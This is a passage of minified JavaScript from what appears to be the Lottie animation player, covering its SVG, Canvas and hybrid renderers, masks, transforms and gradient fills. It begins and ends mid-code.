renderer.")},BaseRenderer.prototype.buildAllItems=function(){var t,e=this.layers.length;for(t=0;t<e;t+=1)this.buildItem(t);this.checkPendingElements()},BaseRenderer.prototype.includeLayers=function(t){this.completeLayers=!1;var e,i,r=t.length,n=this.layers.length;for(e=0;e<r;e+=1)for(i=0;i<n;){if(this.layers[i].id==t[e].id){this.layers[i]=t[e];break}i+=1}},BaseRenderer.prototype.setProjectInterface=function(t){this.globalData.projectInterface=t},BaseRenderer.prototype.initItems=function(){this.globalData.progressiveLoad||this.buildAllItems()},BaseRenderer.prototype.buildElementParenting=function(t,e,i){for(var r=this.elements,n=this.layers,s=0,o=n.length;s<o;)n[s].ind==e&&(r[s]&&!0!==r[s]?(i.push(r[s]),r[s].setAsParent(),void 0!==n[s].parent?this.buildElementParenting(t,n[s].parent,i):t.setHierarchy(i)):(this.buildItem(s),this.addPendingElement(t))),s+=1},BaseRenderer.prototype.addPendingElement=function(t){this.pendingElements.push(t)},BaseRenderer.prototype.searchExtraCompositions=function(t){var e,i=t.length;for(e=0;e<i;e+=1)if(t[e].xt){var r=this.createComp(t[e]);r.initExpressions(),this.globalData.projectInterface.registerComposition(r)}},BaseRenderer.prototype.setupGlobalData=function(t,e){this.globalData.fontManager=new FontManager,this.globalData.fontManager.addChars(t.chars),this.globalData.fontManager.addFonts(t.fonts,e),this.globalData.getAssetData=this.animationItem.getAssetData.bind(this.animationItem),this.globalData.getAssetsPath=this.animationItem.getAssetsPath.bind(this.animationItem),this.globalData.imageLoader=this.animationItem.imagePreloader,this.globalData.frameId=0,this.globalData.frameRate=t.fr,this.globalData.nm=t.nm,this.globalData.compSize={w:t.w,h:t.h}},extendPrototype([BaseRenderer],SVGRenderer),SVGRenderer.prototype.createNull=function(t){return new NullElement(t,this.globalData,this)},SVGRenderer.prototype.createShape=function(t){return new SVGShapeElement(t,this.globalData,this)},SVGRenderer.prototype.createText=function(t){return new SVGTextElement(t,this.globalData,this)},SVGRenderer.prototype.createImage=function(t){return new IImageElement(t,this.globalData,this)},SVGRenderer.prototype.createComp=function(t){return new SVGCompElement(t,this.globalData,this)},SVGRenderer.prototype.createSolid=function(t){return new ISolidElement(t,this.globalData,this)},SVGRenderer.prototype.configAnimation=function(t){this.svgElement.setAttribute("xmlns","http://www.w3.org/2000/svg"),this.renderConfig.viewBoxSize?this.svgElement.setAttribute("viewBox",this.renderConfig.viewBoxSize):this.svgElement.setAttribute("viewBox","0 0 "+t.w+" "+t.h),this.renderConfig.viewBoxOnly||(this.svgElement.setAttribute("width",t.w),this.svgElement.setAttribute("height",t.h),this.svgElement.style.width="100%",this.svgElement.style.height="100%",this.svgElement.style.transform="translate3d(0,0,0)"),this.renderConfig.className&&this.svgElement.setAttribute("class",this.renderConfig.className),this.renderConfig.id&&this.svgElement.setAttribute("id",this.renderConfig.id),void 0!==this.renderConfig.focusable&&this.svgElement.setAttribute("focusable",this.renderConfig.focusable),this.svgElement.setAttribute("preserveAspectRatio",this.renderConfig.preserveAspectRatio),this.animationItem.wrapper.appendChild(this.svgElement);var e=this.globalData.defs;this.setupGlobalData(t,e),this.globalData.progressiveLoad=this.renderConfig.progressiveLoad,this.data=t;var i=createNS("clipPath"),r=createNS("rect");r.setAttribute("width",t.w),r.setAttribute("height",t.h),r.setAttribute("x",0),r.setAttribute("y",0);var n=createElementID();i.setAttribute("id",n),i.appendChild(r),this.layerElement.setAttribute("clip-path","url("+locationHref+"#"+n+")"),e.appendChild(i),this.layers=t.layers,this.elements=createSizedArray(t.layers.length)},SVGRenderer.prototype.destroy=function(){this.animationItem.wrapper.innerHTML="",this.layerElement=null,this.globalData.defs=null;var t,e=this.layers?this.layers.length:0;for(t=0;t<e;t++)this.elements[t]&&this.elements[t].destroy();this.elements.length=0,this.destroyed=!0,this.animationItem=null},SVGRenderer.prototype.updateContainerSize=function(){},SVGRenderer.prototype.buildItem=function(t){var e=this.elements;if(!e[t]&&99!=this.layers[t].ty){e[t]=!0;var i=this.createItem(this.layers[t]);e[t]=i,expressionsPlugin&&(0===this.layers[t].ty&&this.globalData.projectInterface.registerComposition(i),i.initExpressions()),this.appendElementInPos(i,t),this.layers[t].tt&&(this.elements[t-1]&&!0!==this.elements[t-1]?i.setMatte(e[t-1].layerId):(this.buildItem(t-1),this.addPendingElement(i)))}},SVGRenderer.prototype.checkPendingElements=function(){for(;this.pendingElements.length;){var t=this.pendingElements.pop();if(t.checkParenting(),t.data.tt)for(var e=0,i=this.elements.length;e<i;){if(this.elements[e]===t){t.setMatte(this.elements[e-1].layerId);break}e+=1}}},SVGRenderer.prototype.renderFrame=function(t){if(this.renderedFrame!==t&&!this.destroyed){null===t?t=this.renderedFrame:this.renderedFrame=t,this.globalData.frameNum=t,this.globalData.frameId+=1,this.globalData.projectInterface.currentFrame=t,this.globalData._mdf=!1;var e,i=this.layers.length;for(this.completeLayers||this.checkLayers(t),e=i-1;e>=0;e--)(this.completeLayers||this.elements[e])&&this.elements[e].prepareFrame(t-this.layers[e].st);if(this.globalData._mdf)for(e=0;e<i;e+=1)(this.completeLayers||this.elements[e])&&this.elements[e].renderFrame()}},SVGRenderer.prototype.appendElementInPos=function(t,e){var i=t.getBaseElement();if(i){for(var r,n=0;n<e;)this.elements[n]&&!0!==this.elements[n]&&this.elements[n].getBaseElement()&&(r=this.elements[n].getBaseElement()),n+=1;r?this.layerElement.insertBefore(i,r):this.layerElement.appendChild(i)}},SVGRenderer.prototype.hide=function(){this.layerElement.style.display="none"},SVGRenderer.prototype.show=function(){this.layerElement.style.display="block"},extendPrototype([BaseRenderer],CanvasRenderer),CanvasRenderer.prototype.createShape=function(t){return new CVShapeElement(t,this.globalData,this)},CanvasRenderer.prototype.createText=function(t){return new CVTextElement(t,this.globalData,this)},CanvasRenderer.prototype.createImage=function(t){return new CVImageElement(t,this.globalData,this)},CanvasRenderer.prototype.createComp=function(t){return new CVCompElement(t,this.globalData,this)},CanvasRenderer.prototype.createSolid=function(t){return new CVSolidElement(t,this.globalData,this)},CanvasRenderer.prototype.createNull=SVGRenderer.prototype.createNull,CanvasRenderer.prototype.ctxTransform=function(t){if(1!==t[0]||0!==t[1]||0!==t[4]||1!==t[5]||0!==t[12]||0!==t[13]){if(!this.renderConfig.clearCanvas)return void this.canvasContext.transform(t[0],t[1],t[4],t[5],t[12],t[13]);this.transformMat.cloneFromProps(t);var e=this.contextData.cTr.props;this.transformMat.transform(e[0],e[1],e[2],e[3],e[4],e[5],e[6],e[7],e[8],e[9],e[10],e[11],e[12],e[13],e[14],e[15]),this.contextData.cTr.cloneFromProps(this.transformMat.props);var i=this.contextData.cTr.props;this.canvasContext.setTransform(i[0],i[1],i[4],i[5],i[12],i[13])}},CanvasRenderer.prototype.ctxOpacity=function(t){if(!this.renderConfig.clearCanvas)return this.canvasContext.globalAlpha*=t<0?0:t,void(this.globalData.currentGlobalAlpha=this.contextData.cO);this.contextData.cO*=t<0?0:t,this.globalData.currentGlobalAlpha!==this.contextData.cO&&(this.canvasContext.globalAlpha=this.contextData.cO,this.globalData.currentGlobalAlpha=this.contextData.cO)},CanvasRenderer.prototype.reset=function(){this.renderConfig.clearCanvas?this.contextData.reset():this.canvasContext.restore()},CanvasRenderer.prototype.save=function(t){if(this.renderConfig.clearCanvas){t&&this.canvasContext.save();var e=this.contextData.cTr.props;this.contextData._length<=this.contextData.cArrPos&&this.contextData.duplicate();var i,r=this.contextData.saved[this.contextData.cArrPos];for(i=0;i<16;i+=1)r[i]=e[i];this.contextData.savedOp[this.contextData.cArrPos]=this.contextData.cO,this.contextData.cArrPos+=1}else this.canvasContext.save()},CanvasRenderer.prototype.restore=function(t){if(this.renderConfig.clearCanvas){t&&(this.canvasContext.restore(),this.globalData.blendMode="source-over"),this.contextData.cArrPos-=1;var e,i=this.contextData.saved[this.contextData.cArrPos],r=this.contextData.cTr.props;for(e=0;e<16;e+=1)r[e]=i[e];this.canvasContext.setTransform(i[0],i[1],i[4],i[5],i[12],i[13]),i=this.contextData.savedOp[this.contextData.cArrPos],this.contextData.cO=i,this.globalData.currentGlobalAlpha!==i&&(this.canvasContext.globalAlpha=i,this.globalData.currentGlobalAlpha=i)}else this.canvasContext.restore()},CanvasRenderer.prototype.configAnimation=function(t){this.animationItem.wrapper?(this.animationItem.container=createTag("canvas"),this.animationItem.container.style.width="100%",this.animationItem.container.style.height="100%",this.animationItem.container.style.transformOrigin=this.animationItem.container.style.mozTransformOrigin=this.animationItem.container.style.webkitTransformOrigin=this.animationItem.container.style["-webkit-transform"]="0px 0px 0px",this.animationItem.wrapper.appendChild(this.animationItem.container),this.canvasContext=this.animationItem.container.getContext("2d"),this.renderConfig.className&&this.animationItem.container.setAttribute("class",this.renderConfig.className),this.renderConfig.id&&this.animationItem.container.setAttribute("id",this.renderConfig.id)):this.canvasContext=this.renderConfig.context,this.data=t,this.layers=t.layers,this.transformCanvas={w:t.w,h:t.h,sx:0,sy:0,tx:0,ty:0},this.setupGlobalData(t,document.body),this.globalData.canvasContext=this.canvasContext,this.globalData.renderer=this,this.globalData.isDashed=!1,this.globalData.progressiveLoad=this.renderConfig.progressiveLoad,this.globalData.transformCanvas=this.transformCanvas,this.elements=createSizedArray(t.layers.length),this.updateContainerSize()},CanvasRenderer.prototype.updateContainerSize=function(){var t,e,i,r;if(this.reset(),this.animationItem.wrapper&&this.animationItem.container?(t=this.animationItem.wrapper.offsetWidth,e=this.animationItem.wrapper.offsetHeight,this.animationItem.container.setAttribute("width",t*this.renderConfig.dpr),this.animationItem.container.setAttribute("height",e*this.renderConfig.dpr)):(t=this.canvasContext.canvas.width*this.renderConfig.dpr,e=this.canvasContext.canvas.height*this.renderConfig.dpr),-1!==this.renderConfig.preserveAspectRatio.indexOf("meet")||-1!==this.renderConfig.preserveAspectRatio.indexOf("slice")){var n=this.renderConfig.preserveAspectRatio.split(" "),s=n[1]||"meet",o=n[0]||"xMidYMid",a=o.substr(0,4),l=o.substr(4);i=t/e,(r=this.transformCanvas.w/this.transformCanvas.h)>i&&"meet"===s||r<i&&"slice"===s?(this.transformCanvas.sx=t/(this.transformCanvas.w/this.renderConfig.dpr),this.transformCanvas.sy=t/(this.transformCanvas.w/this.renderConfig.dpr)):(this.transformCanvas.sx=e/(this.transformCanvas.h/this.renderConfig.dpr),this.transformCanvas.sy=e/(this.transformCanvas.h/this.renderConfig.dpr)),this.transformCanvas.tx="xMid"===a&&(r<i&&"meet"===s||r>i&&"slice"===s)?(t-this.transformCanvas.w*(e/this.transformCanvas.h))/2*this.renderConfig.dpr:"xMax"===a&&(r<i&&"meet"===s||r>i&&"slice"===s)?(t-this.transformCanvas.w*(e/this.transformCanvas.h))*this.renderConfig.dpr:0,this.transformCanvas.ty="YMid"===l&&(r>i&&"meet"===s||r<i&&"slice"===s)?(e-this.transformCanvas.h*(t/this.transformCanvas.w))/2*this.renderConfig.dpr:"YMax"===l&&(r>i&&"meet"===s||r<i&&"slice"===s)?(e-this.transformCanvas.h*(t/this.transformCanvas.w))*this.renderConfig.dpr:0}else"none"==this.renderConfig.preserveAspectRatio?(this.transformCanvas.sx=t/(this.transformCanvas.w/this.renderConfig.dpr),this.transformCanvas.sy=e/(this.transformCanvas.h/this.renderConfig.dpr),this.transformCanvas.tx=0,this.transformCanvas.ty=0):(this.transformCanvas.sx=this.renderConfig.dpr,this.transformCanvas.sy=this.renderConfig.dpr,this.transformCanvas.tx=0,this.transformCanvas.ty=0);this.transformCanvas.props=[this.transformCanvas.sx,0,0,0,0,this.transformCanvas.sy,0,0,0,0,1,0,this.transformCanvas.tx,this.transformCanvas.ty,0,1],this.ctxTransform(this.transformCanvas.props),this.canvasContext.beginPath(),this.canvasContext.rect(0,0,this.transformCanvas.w,this.transformCanvas.h),this.canvasContext.closePath(),this.canvasContext.clip(),this.renderFrame(this.renderedFrame,!0)},CanvasRenderer.prototype.destroy=function(){var t;for(this.renderConfig.clearCanvas&&(this.animationItem.wrapper.innerHTML=""),t=(this.layers?this.layers.length:0)-1;t>=0;t-=1)this.elements[t]&&this.elements[t].destroy();this.elements.length=0,this.globalData.canvasContext=null,this.animationItem.container=null,this.destroyed=!0},CanvasRenderer.prototype.renderFrame=function(t,e){if((this.renderedFrame!==t||!0!==this.renderConfig.clearCanvas||e)&&!this.destroyed&&-1!==t){this.renderedFrame=t,this.globalData.frameNum=t-this.animationItem._isFirstFrame,this.globalData.frameId+=1,this.globalData._mdf=!this.renderConfig.clearCanvas||e,this.globalData.projectInterface.currentFrame=t;var i,r=this.layers.length;for(this.completeLayers||this.checkLayers(t),i=0;i<r;i++)(this.completeLayers||this.elements[i])&&this.elements[i].prepareFrame(t-this.layers[i].st);if(this.globalData._mdf){for(!0===this.renderConfig.clearCanvas?this.canvasContext.clearRect(0,0,this.transformCanvas.w,this.transformCanvas.h):this.save(),i=r-1;i>=0;i-=1)(this.completeLayers||this.elements[i])&&this.elements[i].renderFrame();!0!==this.renderConfig.clearCanvas&&this.restore()}}},CanvasRenderer.prototype.buildItem=function(t){var e=this.elements;if(!e[t]&&99!=this.layers[t].ty){var i=this.createItem(this.layers[t],this,this.globalData);e[t]=i,i.initExpressions()}},CanvasRenderer.prototype.checkPendingElements=function(){for(;this.pendingElements.length;)this.pendingElements.pop().checkParenting()},CanvasRenderer.prototype.hide=function(){this.animationItem.container.style.display="none"},CanvasRenderer.prototype.show=function(){this.animationItem.container.style.display="block"},extendPrototype([BaseRenderer],HybridRenderer),HybridRenderer.prototype.buildItem=SVGRenderer.prototype.buildItem,HybridRenderer.prototype.checkPendingElements=function(){for(;this.pendingElements.length;)this.pendingElements.pop().checkParenting()},HybridRenderer.prototype.appendElementInPos=function(t,e){var i=t.getBaseElement();if(i){var r=this.layers[e];if(r.ddd&&this.supports3d)this.addTo3dContainer(i,e);else if(this.threeDElements)this.addTo3dContainer(i,e);else{for(var n,s,o=0;o<e;)this.elements[o]&&!0!==this.elements[o]&&this.elements[o].getBaseElement&&(s=this.elements[o],n=(this.layers[o].ddd?this.getThreeDContainerByPos(o):s.getBaseElement())||n),o+=1;n?(!r.ddd||!this.supports3d)&&this.layerElement.insertBefore(i,n):(!r.ddd||!this.supports3d)&&this.layerElement.appendChild(i)}}},HybridRenderer.prototype.createShape=function(t){return this.supports3d?new HShapeElement(t,this.globalData,this):new SVGShapeElement(t,this.globalData,this)},HybridRenderer.prototype.createText=function(t){return this.supports3d?new HTextElement(t,this.globalData,this):new SVGTextElement(t,this.globalData,this)},HybridRenderer.prototype.createCamera=function(t){return this.camera=new HCameraElement(t,this.globalData,this),this.camera},HybridRenderer.prototype.createImage=function(t){return this.supports3d?new HImageElement(t,this.globalData,this):new IImageElement(t,this.globalData,this)},HybridRenderer.prototype.createComp=function(t){return this.supports3d?new HCompElement(t,this.globalData,this):new SVGCompElement(t,this.globalData,this)},HybridRenderer.prototype.createSolid=function(t){return this.supports3d?new HSolidElement(t,this.globalData,this):new ISolidElement(t,this.globalData,this)},HybridRenderer.prototype.createNull=SVGRenderer.prototype.createNull,HybridRenderer.prototype.getThreeDContainerByPos=function(t){for(var e=0,i=this.threeDElements.length;e<i;){if(this.threeDElements[e].startPos<=t&&this.threeDElements[e].endPos>=t)return this.threeDElements[e].perspectiveElem;e+=1}},HybridRenderer.prototype.createThreeDContainer=function(t,e){var i=createTag("div");styleDiv(i);var r=createTag("div");styleDiv(r),"3d"===e&&(i.style.width=this.globalData.compSize.w+"px",i.style.height=this.globalData.compSize.h+"px",i.style.transformOrigin=i.style.mozTransformOrigin=i.style.webkitTransformOrigin="50% 50%",r.style.transform=r.style.webkitTransform="matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)"),i.appendChild(r);var n={container:r,perspectiveElem:i,startPos:t,endPos:t,type:e};return this.threeDElements.push(n),n},HybridRenderer.prototype.build3dContainers=function(){var t,e,i=this.layers.length,r="";for(t=0;t<i;t+=1)this.layers[t].ddd&&3!==this.layers[t].ty?("3d"!==r&&(r="3d",e=this.createThreeDContainer(t,"3d")),e.endPos=Math.max(e.endPos,t)):("2d"!==r&&(r="2d",e=this.createThreeDContainer(t,"2d")),e.endPos=Math.max(e.endPos,t));for(t=(i=this.threeDElements.length)-1;t>=0;t--)this.resizerElem.appendChild(this.threeDElements[t].perspectiveElem)},HybridRenderer.prototype.addTo3dContainer=function(t,e){for(var i=0,r=this.threeDElements.length;i<r;){if(e<=this.threeDElements[i].endPos){for(var n,s=this.threeDElements[i].startPos;s<e;)this.elements[s]&&this.elements[s].getBaseElement&&(n=this.elements[s].getBaseElement()),s+=1;n?this.threeDElements[i].container.insertBefore(t,n):this.threeDElements[i].container.appendChild(t);break}i+=1}},HybridRenderer.prototype.configAnimation=function(t){var e=createTag("div"),i=this.animationItem.wrapper;e.style.width=t.w+"px",e.style.height=t.h+"px",this.resizerElem=e,styleDiv(e),e.style.transformStyle=e.style.webkitTransformStyle=e.style.mozTransformStyle="flat",this.renderConfig.className&&e.setAttribute("class",this.renderConfig.className),i.appendChild(e),e.style.overflow="hidden";var r=createNS("svg");r.setAttribute("width","1"),r.setAttribute("height","1"),styleDiv(r),this.resizerElem.appendChild(r);var n=createNS("defs");r.appendChild(n),this.data=t,this.setupGlobalData(t,r),this.globalData.defs=n,this.layers=t.layers,this.layerElement=this.resizerElem,this.build3dContainers(),this.updateContainerSize()},HybridRenderer.prototype.destroy=function(){this.animationItem.wrapper.innerHTML="",this.animationItem.container=null,this.globalData.defs=null;var t,e=this.layers?this.layers.length:0;for(t=0;t<e;t++)this.elements[t].destroy();this.elements.length=0,this.destroyed=!0,this.animationItem=null},HybridRenderer.prototype.updateContainerSize=function(){var t,e,i,r,n=this.animationItem.wrapper.offsetWidth,s=this.animationItem.wrapper.offsetHeight,o=n/s;this.globalData.compSize.w/this.globalData.compSize.h>o?(t=n/this.globalData.compSize.w,e=n/this.globalData.compSize.w,i=0,r=(s-this.globalData.compSize.h*(n/this.globalData.compSize.w))/2):(t=s/this.globalData.compSize.h,e=s/this.globalData.compSize.h,i=(n-this.globalData.compSize.w*(s/this.globalData.compSize.h))/2,r=0),this.resizerElem.style.transform=this.resizerElem.style.webkitTransform="matrix3d("+t+",0,0,0,0,"+e+",0,0,0,0,1,0,"+i+","+r+",0,1)"},HybridRenderer.prototype.renderFrame=SVGRenderer.prototype.renderFrame,HybridRenderer.prototype.hide=function(){this.resizerElem.style.display="none"},HybridRenderer.prototype.show=function(){this.resizerElem.style.display="block"},HybridRenderer.prototype.initItems=function(){if(this.buildAllItems(),this.camera)this.camera.setup();else{var t,e=this.globalData.compSize.w,i=this.globalData.compSize.h,r=this.threeDElements.length;for(t=0;t<r;t+=1)this.threeDElements[t].perspectiveElem.style.perspective=this.threeDElements[t].perspectiveElem.style.webkitPerspective=Math.sqrt(Math.pow(e,2)+Math.pow(i,2))+"px"}},HybridRenderer.prototype.searchExtraCompositions=function(t){var e,i=t.length,r=createTag("div");for(e=0;e<i;e+=1)if(t[e].xt){var n=this.createComp(t[e],r,this.globalData.comp,null);n.initExpressions(),this.globalData.projectInterface.registerComposition(n)}},MaskElement.prototype.getMaskProperty=function(t){return this.viewData[t].prop},MaskElement.prototype.renderFrame=function(t){var e,i=this.element.finalTransform.mat,r=this.masksProperties.length;for(e=0;e<r;e++)if((this.viewData[e].prop._mdf||t)&&this.drawPath(this.masksProperties[e],this.viewData[e].prop.v,this.viewData[e]),(this.viewData[e].op._mdf||t)&&this.viewData[e].elem.setAttribute("fill-opacity",this.viewData[e].op.v),"n"!==this.masksProperties[e].mode&&(this.viewData[e].invRect&&(this.element.finalTransform.mProp._mdf||t)&&this.viewData[e].invRect.setAttribute("transform",i.getInverseMatrix().to2dCSS()),this.storedData[e].x&&(this.storedData[e].x._mdf||t))){var n=this.storedData[e].expan;this.storedData[e].x.v<0?("erode"!==this.storedData[e].lastOperator&&(this.storedData[e].lastOperator="erode",this.storedData[e].elem.setAttribute("filter","url("+locationHref+"#"+this.storedData[e].filterId+")")),n.setAttribute("radius",-this.storedData[e].x.v)):("dilate"!==this.storedData[e].lastOperator&&(this.storedData[e].lastOperator="dilate",this.storedData[e].elem.setAttribute("filter",null)),this.storedData[e].elem.setAttribute("stroke-width",2*this.storedData[e].x.v))}},MaskElement.prototype.getMaskelement=function(){return this.maskElement},MaskElement.prototype.createLayerSolidPath=function(){var t="M0,0 ";return t+=" h"+this.globalData.compSize.w,t+=" v"+this.globalData.compSize.h,t+=" h-"+this.globalData.compSize.w,t+=" v-"+this.globalData.compSize.h+" "},MaskElement.prototype.drawPath=function(t,e,i){var r,n,s=" M"+e.v[0][0]+","+e.v[0][1];for(n=e._length,r=1;r<n;r+=1)s+=" C"+e.o[r-1][0]+","+e.o[r-1][1]+" "+e.i[r][0]+","+e.i[r][1]+" "+e.v[r][0]+","+e.v[r][1];if(e.c&&n>1&&(s+=" C"+e.o[r-1][0]+","+e.o[r-1][1]+" "+e.i[0][0]+","+e.i[0][1]+" "+e.v[0][0]+","+e.v[0][1]),i.lastPath!==s){var o="";i.elem&&(e.c&&(o=t.inv?this.solidPath+s:s),i.elem.setAttribute("d",o)),i.lastPath=s}},MaskElement.prototype.destroy=function(){this.element=null,this.globalData=null,this.maskElement=null,this.data=null,this.masksProperties=null},HierarchyElement.prototype={initHierarchy:function(){this.hierarchy=[],this._isParent=!1,this.checkParenting()},setHierarchy:function(t){this.hierarchy=t},setAsParent:function(){this._isParent=!0},checkParenting:function(){void 0!==this.data.parent&&this.comp.buildElementParenting(this,this.data.parent,[])}},FrameElement.prototype={initFrame:function(){this._isFirstFrame=!1,this.dynamicProperties=[],this._mdf=!1},prepareProperties:function(t,e){var i,r=this.dynamicProperties.length;for(i=0;i<r;i+=1)(e||this._isParent&&"transform"===this.dynamicProperties[i].propType)&&(this.dynamicProperties[i].getValue(),this.dynamicProperties[i]._mdf&&(this.globalData._mdf=!0,this._mdf=!0))},addDynamicProperty:function(t){-1===this.dynamicProperties.indexOf(t)&&this.dynamicProperties.push(t)}},TransformElement.prototype={initTransform:function(){this.finalTransform={mProp:this.data.ks?TransformPropertyFactory.getTransformProperty(this,this.data.ks,this):{o:0},_matMdf:!1,_opMdf:!1,mat:new Matrix},this.data.ao&&(this.finalTransform.mProp.autoOriented=!0),this.data.ty},renderTransform:function(){if(this.finalTransform._opMdf=this.finalTransform.mProp.o._mdf||this._isFirstFrame,this.finalTransform._matMdf=this.finalTransform.mProp._mdf||this._isFirstFrame,this.hierarchy){var t,e=this.finalTransform.mat,i=0,r=this.hierarchy.length;if(!this.finalTransform._matMdf)for(;i<r;){if(this.hierarchy[i].finalTransform.mProp._mdf){this.finalTransform._matMdf=!0;break}i+=1}if(this.finalTransform._matMdf)for(t=this.finalTransform.mProp.v.props,e.cloneFromProps(t),i=0;i<r;i+=1)t=this.hierarchy[i].finalTransform.mProp.v.props,e.transform(t[0],t[1],t[2],t[3],t[4],t[5],t[6],t[7],t[8],t[9],t[10],t[11],t[12],t[13],t[14],t[15])}},globalToLocal:function(t){var e=[];e.push(this.finalTransform);for(var i=!0,r=this.comp;i;)r.finalTransform?(r.data.hasMask&&e.splice(0,0,r.finalTransform),r=r.comp):i=!1;var n,s,o=e.length;for(n=0;n<o;n+=1)s=e[n].mat.applyToPointArray(0,0,0),t=[t[0]-s[0],t[1]-s[1],0];return t},mHelper:new Matrix},RenderableElement.prototype={initRenderable:function(){this.isInRange=!1,this.hidden=!1,this.isTransparent=!1,this.renderableComponents=[]},addRenderableComponent:function(t){-1===this.renderableComponents.indexOf(t)&&this.renderableComponents.push(t)},removeRenderableComponent:function(t){-1!==this.renderableComponents.indexOf(t)&&this.renderableComponents.splice(this.renderableComponents.indexOf(t),1)},prepareRenderableFrame:function(t){this.checkLayerLimits(t)},checkTransparency:function(){this.finalTransform.mProp.o.v<=0?!this.isTransparent&&this.globalData.renderConfig.hideOnTransparent&&(this.isTransparent=!0,this.hide()):this.isTransparent&&(this.isTransparent=!1,this.show())},checkLayerLimits:function(t){this.data.ip-this.data.st<=t&&this.data.op-this.data.st>t?!0!==this.isInRange&&(this.globalData._mdf=!0,this._mdf=!0,this.isInRange=!0,this.show()):!1!==this.isInRange&&(this.globalData._mdf=!0,this.isInRange=!1,this.hide())},renderRenderable:function(){var t,e=this.renderableComponents.length;for(t=0;t<e;t+=1)this.renderableComponents[t].renderFrame(this._isFirstFrame)},sourceRectAtTime:function(){return{top:0,left:0,width:100,height:100}},getLayerSize:function(){return 5===this.data.ty?{w:this.data.textData.width,h:this.data.textData.height}:{w:this.data.width,h:this.data.height}}},extendPrototype([RenderableElement,createProxyFunction({initElement:function(t,e,i){this.initFrame(),this.initBaseData(t,e,i),this.initTransform(t,e,i),this.initHierarchy(),this.initRenderable(),this.initRendererElement(),this.createContainerElements(),this.createRenderableComponents(),this.createContent(),this.hide()},hide:function(){this.hidden||this.isInRange&&!this.isTransparent||((this.baseElement||this.layerElement).style.display="none",this.hidden=!0)},show:function(){this.isInRange&&!this.isTransparent&&(this.data.hd||((this.baseElement||this.layerElement).style.display="block"),this.hidden=!1,this._isFirstFrame=!0)},renderFrame:function(){this.data.hd||this.hidden||(this.renderTransform(),this.renderRenderable(),this.renderElement(),this.renderInnerContent(),this._isFirstFrame&&(this._isFirstFrame=!1))},renderInnerContent:function(){},prepareFrame:function(t){this._mdf=!1,this.prepareRenderableFrame(t),this.prepareProperties(t,this.isInRange),this.checkTransparency()},destroy:function(){this.innerElem=null,this.destroyBaseElement()}})],RenderableDOMElement),SVGStyleData.prototype.reset=function(){this.d="",this._mdf=!1},SVGShapeData.prototype.setAsAnimated=function(){this._isAnimated=!0},extendPrototype([DynamicPropertyContainer],SVGStrokeStyleData),extendPrototype([DynamicPropertyContainer],SVGFillStyleData),SVGGradientFillStyleData.prototype.initGradientData=function(t,e,i){this.o=PropertyFactory.getProp(t,e.o,0,.01,this),this.s=PropertyFactory.getProp(t,e.s,1,null,this),this.e=PropertyFactory.getProp(t,e.e,1,null,this),this.h=PropertyFactory.getProp(t,e.h||{k:0},0,.01,this),this.a=PropertyFactory.getProp(t,e.a||{k:0},0,degToRads,this),this.g=new GradientProperty(t,e.g,this),this.style=i,this.stops=[],this.setGradientData(i.pElem,e),this.setGradientOpacity(e,i),this._isAnimated=!!this._isAnimated},SVGGradientFillStyleData.prototype.setGradientData=function(t,e){var i=createElementID(),r=createNS(1===e.t?"linearGradient":"radialGradient");r.setAttribute("id",i),r.setAttribute("spreadMethod","pad"),r.setAttribute("gradientUnits","userSpaceOnUse");var n,s,o,a=[];for(o=4*e.g.p,s=0;s<o;s+=4)n=createNS("stop"),r.appendChild(n),a.push(n);t.setAttribute("gf"===e.ty?"fill":"stroke","url("+locationHref+"#"+i+")"),this.gf=r,this.cst=a},SVGGradientFillStyleData.prototype.setGradientOpacity=function(t,e){if(this.g._hasOpacity&&!this.g._collapsable){var i,r,n,s=createNS("mask"),o=createNS("path");s.appendChild(o);var a=createElementID(),l=createElementID();s.setAttribute("id",l);var h=createNS(1===t.t?"linearGradient":"radialGradient");h.setAttribute("id",a),h.setAttribute("spreadMethod","pad"),h.setAttribute("gradientUnits","userSpaceOnUse"),n=t.g.k.k[0].s?t.g.k.k[0].s.length:t.g.k.k.length;var c=this.stops;for(r=4*t.g.p;r<n;r+=2)(i=createNS("stop")).setAttribute("stop-color","rgb(255,255,255)"),h.appendChild(i),c.push(i);o.setAttribute("gf"===t.ty?"fill":"stroke","url("+locationHref+"#"+a+")"),this.of=h,this.ms=s,this.ost=c,this.maskId=l,e.msElem=o}},extendPrototype([DynamicPropertyContainer],SVGGradientFillStyleData),extendPrototype([SVGGradientFillStyleData,DynamicPropertyContainer],SVGGradientStrokeStyleData);var SVGElementsRenderer=function(){var t=new Matrix,e=new Matrix;function i(t,e,i){(i||e.transform.op._mdf)&&e.transform.container.setAttribute("opacity",e.transform.op.v),(i||e.transform.mProps._mdf)&&e.transform.container.setAttribute("transform",e.transform.mProps.v.to2dCSS())}function r(i,r,n){var s,o,a,l,h,c,u,d,p,m,f,g=r.styles.length,y=r.lvl;for(c=0;c<g;c+=1){if(l=r.sh._mdf||n,r.styles[c].lvl<y){for(d=e.reset(),m=y-r.styles[c].lvl,f=r.transformers.length-1;!l&&m>0;)l=r.transformers[f].mProps._mdf||l,m--,f--;if(l)for(m=y-r.styles[c].lvl,f=r.transformers.length-1;m>0;)p=r.transformers[f].mProps.v.props,d.transform(p[0],p[1],p[2],p[3],p[4],p[5],p[6],p[7],p[8],p[9],p[10],p[11],p[12],p[13],p[14],p[15]),m--,f--}else d=t;if(o=(u=r.sh.paths)._length,l){for(a="",s=0;s<o;s+=1)(h=u.shapes[s])&&h._length&&(a+=buildShapeString(h,h._length,h.c,d));r.caches[c]=a}else a=r.caches[c];r.styles[c].d+=!0===i.hd?"":a,r.styles[c]._mdf=l||r.styles[c]._mdf}}function n(t,e,i){var r=e.style;(e.c._mdf||i)&&r.pElem.setAttribute("fill","rgb("+bm_floor(e.c.v[0])+","+bm_floor(e.c.v[1])+","+bm_floor(e.c.v[2])+")"),(e.o._mdf||i)&&r.pElem.setAttribute("fill-opacity",e.o.v)}function s(t,e,i){o(t,e,i),a(0,e,i)}function o(t,e,i){var r,n,s,o,a,l=e.gf,h=e.g._hasOpacity,c=e.s.v,u=e.e.v;if(e.o._mdf||i){var d="gf"===t.ty?"fill-opacity":"stroke-opacity";e.style.pElem.setAttribute(d,e.o.v)}if(e.s._mdf||i){var p=1===t.t?"x1":"cx",m="x1"===p?"y1":"cy";l.setAttribute(p,c[0]),l.setAttribute(m,c[1]),h&&!e.g._collapsable&&(e.of.setAttribute(p,c[0]),e.of.setAttribute(m,c[1]))}if(e.g._cmdf||i){r=e.cst;var 